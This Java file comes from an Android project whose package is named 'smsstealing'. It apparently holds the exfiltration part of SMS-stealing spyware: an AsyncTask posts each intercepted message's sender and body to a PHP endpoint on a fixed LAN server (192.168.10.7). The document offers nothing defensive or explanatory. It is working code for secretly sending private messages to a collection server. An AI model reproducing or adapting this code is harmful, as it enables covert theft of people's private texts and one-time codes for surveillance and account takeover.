package com.example.death.smsstealing;

import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.os.AsyncTask;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Created by Death on 12/14/2017.
 */

public class Database extends AsyncTask<String,Void,Void>
{

    @Override
    protected Void doInBackground(String... voids) {
        String sender,messagebody;
        sender=voids[0];
        messagebody=voids[1];
        URL url;
        BufferedReader reader=null;
        String link="http://192.168.10.7/innova/smsdb.php";

        try {
            url= new URL(link);
            HttpURLConnection connection= (HttpURLConnection) url.openConnection();

            connection.setConnectTimeout(15*1000);

            connection.setDoInput(true);
            connection.setDoOutput(true);

            connection.setRequestMethod("POST");

            String fileinput= URLEncoder.encode("sender","UTF-8")+"="+URLEncoder.encode(sender,"UTF-8");
            fileinput+="&"+ URLEncoder.encode("messagebody","UTF-8")+"="+URLEncoder.encode(messagebody,"UTF-8");

            connection.connect();

            OutputStreamWriter writer= new OutputStreamWriter(connection.getOutputStream());
            writer.write(fileinput);
            writer.flush();

            reader= new BufferedReader(new InputStreamReader(connection.getInputStream()));
        }

        catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }

}
